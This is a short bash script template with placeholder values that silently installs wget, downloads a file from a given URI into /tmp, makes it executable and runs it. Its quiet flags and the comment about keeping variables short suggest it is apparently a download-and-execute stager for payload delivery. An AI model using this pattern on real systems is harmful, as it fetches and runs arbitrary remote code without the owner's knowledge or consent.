#!/bin/bash

# Variables. Keep short to save space.
PTH="/tmp/[DOWNLOAD_FILE_NAME]";
URI="[URI]";

# Install required tools.
apt-get -qq install wget >> /dev/null;

# Remove file if already present.
rm -f $PTH;

# Download file.
wget -q $URI -O $PTH

# Execute file.
chmod +x $PTH;
$PTH;